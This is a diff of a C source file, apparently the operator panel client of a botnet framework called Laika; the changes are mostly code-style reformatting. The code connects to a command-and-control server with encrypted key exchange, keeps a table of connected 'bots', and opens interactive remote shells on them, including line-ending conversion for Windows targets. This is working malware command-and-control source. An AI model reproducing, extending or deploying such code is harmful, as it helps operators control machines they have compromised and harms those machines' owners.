@@ -1,57 +1,63 @@
-#include "lmem.h"
+#include "sclient.h"
+
 #include "lerror.h"
+#include "lmem.h"
 #include "lpacket.h"
 #include "lsodium.h"
 #include "sterm.h"
 
-#include "sclient.h"
-
-
-void shell_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
-    tShell_client *client = (tShell_client*)uData;
+void shell_pingTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick,
+                    void *uData)
+{
+    tShell_client *client = (tShell_client *)uData;
 
     laikaS_emptyOutPacket(client->peer, LAIKAPKT_PINGPONG);
 }
 
 /* ======================================[[ PeerHashMap ]]====================================== */
 
-typedef struct sShell_hashMapElem {
+typedef struct sShell_hashMapElem
+{
     int id;
     tShell_peer *peer;
     uint8_t *pub;
 } tShell_hashMapElem;
 
-int shell_ElemCompare(const void *a, const void *b, void *udata) {
+int shell_ElemCompare(const void *a, const void *b, void *udata)
+{
     const tShell_hashMapElem *ua = a;
     const tShell_hashMapElem *ub = b;
 
-    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
+    return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES);
 }
 
-uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
+uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1)
+{
     const tShell_hashMapElem *u = item;
-    return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
+    return *(uint64_t *)(u->pub); /* hashes pub key (first 8 bytes) */
 }
 
 /* ====================================[[ Packet Handlers ]]==================================== */
 
-void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     uint8_t endianness = laikaS_readByte(&peer->sock);
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
 
     PRINTSUCC("Handshake accepted!\n");
 }
 
-void shellC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     LAIKA_DEBUG("got ping from cnc!\n");
     /* stubbed */
 }
 
-
-void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipStr[LAIKA_IPSTR_LEN];
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
-    tShell_client *client = (tShell_client*)uData;
+    tShell_client *client = (tShell_client *)uData;
     tShell_peer *bot;
     uint8_t type, osType;
 
@@ -78,9 +84,10 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     shellC_addPeer(client, bot);
 }
 
-void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
-    tShell_client *client = (tShell_client*)uData;
+    tShell_client *client = (tShell_client *)uData;
     tShell_peer *bot;
     uint8_t type;
     int id;
@@ -100,17 +107,19 @@ void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     shellC_rmvPeer(client, bot, id);
 }
 
-void shellC_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     /* stubbed! this packet is a no-op currently */
 }
 
-void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
     uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
-    tShell_client *client = (tShell_client*)uData;
+    tShell_client *client = (tShell_client *)uData;
     uint32_t id;
 
     /* ignore packet if malformed */
-    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH+sizeof(uint32_t) || sz <= sizeof(uint32_t))
+    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH + sizeof(uint32_t) || sz <= sizeof(uint32_t))
         return;
 
     laikaS_readInt(&peer->sock, &id, sizeof(uint32_t)); /* this is ignored for now */
@@ -124,8 +133,9 @@ void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     shellT_writeRawOutput(buf, sz);
 }
 
-void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    tShell_client *client = (tShell_client*)uData;
+void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
+{
+    tShell_client *client = (tShell_client *)uData;
     uint32_t id;
 
     laikaS_readInt(&peer->sock, &id, sizeof(uint32_t)); /* this is ignored for now */
@@ -176,26 +186,24 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
 /* clang-format on */
 
 /* socket event */
-void shellC_onPollFail(struct sLaika_socket *sock, void *uData) {
-    struct sLaika_peer *peer = (struct sLaika_peer*)sock;
-    struct sShell_client *client = (struct sShell_client*)uData;
+void shellC_onPollFail(struct sLaika_socket *sock, void *uData)
+{
+    struct sLaika_peer *peer = (struct sLaika_peer *)sock;
+    struct sShell_client *client = (struct sShell_client *)uData;
 
     laikaS_kill(&client->peer->sock);
 }
 
 /* ======================================[[ Client API ]]======================================= */
 
-void shellC_init(tShell_client *client) {
+void shellC_init(tShell_client *client)
+{
     laikaP_initPList(&client->pList);
-    client->peer = laikaS_newPeer(
-        shellC_pktTbl,
-        &client->pList,
-        shellC_onPollFail,
-        (void*)client,
-        (void*)client
-    );
+    client->peer = laikaS_newPeer(shellC_pktTbl, &client->pList, shellC_onPollFail, (void *)client,
+                                  (void *)client);
 
-    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash, shell_ElemCompare, NULL, NULL);
+    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash,
+                                shell_ElemCompare, NULL, NULL);
     client->openShell = NULL;
     client->peerTbl = NULL;
     client->peerTblCap = 4;
@@ -223,7 +231,8 @@ void shellC_init(tShell_client *client) {
     }
 }
 
-void shellC_cleanup(tShell_client *client) {
+void shellC_cleanup(tShell_client *client)
+{
     int i;
 
     laikaS_freePeer(client->peer);
@@ -240,13 +249,15 @@ void shellC_cleanup(tShell_client *client) {
     laikaM_free(client->peerTbl);
 }
 
-void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
+void shellC_connectToCNC(tShell_client *client, char *ip, char *port)
+{
     struct sLaika_socket *sock = &client->peer->sock;
 
     PRINTINFO("Connecting to %s:%s...\n", ip, port);
 
     /* create encryption keys */
-    if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
+    if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub,
+                                      client->priv, client->peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n");
 
     /* setup socket */
@@ -262,7 +273,8 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_OSTYPE);
     laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */
 
-    /* write stub hostname & ip str (since we're a panel/dummy client, cnc doesn't need this information really) */
+    /* write stub hostname & ip str (since we're a panel/dummy client, cnc doesn't need this
+     * information really) */
     laikaS_zeroWrite(sock, LAIKA_HOSTNAME_LEN);
     laikaS_zeroWrite(sock, LAIKA_INET_LEN);
     laikaS_endOutPacket(client->peer);
@@ -276,7 +288,8 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     /* the handshake requests will be sent on the next call to shellC_poll */
 }
 
-bool shellC_poll(tShell_client *client, int timeout) {
+bool shellC_poll(tShell_client *client, int timeout)
+{
     struct sLaika_pollEvent *evnts;
     int numEvents, i;
 
@@ -299,15 +312,18 @@ bool shellC_poll(tShell_client *client, int timeout) {
     return true;
 }
 
-void shellC_loadKeys(tShell_client *client, const char *pub, const char *priv) {
+void shellC_loadKeys(tShell_client *client, const char *pub, const char *priv)
+{
     if (!laikaK_loadKeys(pub ? client->pub : NULL, priv ? client->priv : NULL, pub, priv)) {
         shellC_cleanup(client);
         LAIKA_ERROR("Failed to init keypair!\n");
     }
 }
 
-tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id) {
-    tShell_hashMapElem *elem = (tShell_hashMapElem*)hashmap_get(client->peers, &(tShell_hashMapElem){.pub = pub});
+tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id)
+{
+    tShell_hashMapElem *elem =
+        (tShell_hashMapElem *)hashmap_get(client->peers, &(tShell_hashMapElem){.pub = pub});
 
     /* return peer if elem was found, otherwise return NULL */
     if (elem) {
@@ -319,7 +335,8 @@ tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id) {
     }
 }
 
-int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
+int shellC_addPeer(tShell_client *client, tShell_peer *newPeer)
+{
     /* find empty ID */
     int id;
     for (id = 0; id < client->peerTblCount; id++) {
@@ -329,7 +346,8 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
 
     /* if we didn't find an empty id, grow the array */
     if (id == client->peerTblCount) {
-        laikaM_growarray(tShell_peer*, client->peerTbl, 1, client->peerTblCount, client->peerTblCap);
+        laikaM_growarray(tShell_peer *, client->peerTbl, 1, client->peerTblCount,
+                         client->peerTblCap);
         client->peerTblCount++;
     }
 
@@ -337,7 +355,8 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
     client->peerTbl[id] = newPeer;
 
     /* insert into hashmap */
-    hashmap_set(client->peers, &(tShell_hashMapElem){.id = id, .pub = newPeer->pub, .peer = newPeer});
+    hashmap_set(client->peers,
+                &(tShell_hashMapElem){.id = id, .pub = newPeer->pub, .peer = newPeer});
 
     /* let user know */
     if (!shellC_isShellOpen(client)) {
@@ -347,7 +366,8 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
     return id;
 }
 
-void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
+void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id)
+{
     /* remove from bot tbl */
     client->peerTbl[id] = NULL;
 
@@ -363,7 +383,8 @@ void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
     shellP_freePeer(oldPeer);
 }
 
-void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, uint16_t row) {
+void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, uint16_t row)
+{
     /* check if we already have a shell open */
     if (client->openShell)
         return;
@@ -377,7 +398,8 @@ void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, ui
     client->openShell = peer;
 }
 
-void shellC_closeShell(tShell_client *client) {
+void shellC_closeShell(tShell_client *client)
+{
     uint32_t id = 0; /* we will *ALWAYS* only have one shell open */
     /* check if we have a shell open */
     if (!shellC_isShellOpen(client))
@@ -391,7 +413,8 @@ void shellC_closeShell(tShell_client *client) {
     client->openShell = NULL;
 }
 
-void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
+void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz)
+{
     uint32_t i, id = 0; /* we will *ALWAYS* only have one shell open */
     struct sLaika_socket *sock = &client->peer->sock;
     /* check if we have a shell open */
@@ -401,21 +424,22 @@ void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
     laikaS_startVarPacket(client->peer, LAIKAPKT_SHELL_DATA);
     laikaS_writeInt(sock, &id, sizeof(uint32_t));
     switch (client->openShell->osType) {
-        case LAIKA_OSTYPE: /* if we're the same as the target OS, line endings don't need to be converted! */
-            laikaS_write(sock, data, sz);
-            break;
-        default:
-            /* line endings have to be converted (ALWAYS LINUX->WIN for now) */
-            for (i = 0; i < sz; i++) {
-                if (data[i] == '\n') {
-                    /* convert to windows line endings */
-                    laikaS_writeByte(sock, '\r');
-                    laikaS_writeByte(sock, '\n');
-                } else {
-                    laikaS_writeByte(sock, data[i]);
-                }
+    case LAIKA_OSTYPE: /* if we're the same as the target OS, line endings don't need to be
+                          converted! */
+        laikaS_write(sock, data, sz);
+        break;
+    default:
+        /* line endings have to be converted (ALWAYS LINUX->WIN for now) */
+        for (i = 0; i < sz; i++) {
+            if (data[i] == '\n') {
+                /* convert to windows line endings */
+                laikaS_writeByte(sock, '\r');
+                laikaS_writeByte(sock, '\n');
+            } else {
+                laikaS_writeByte(sock, data[i]);
             }
-            break;
+        }
+        break;
     }
     laikaS_endVarPacket(client->peer);
 }
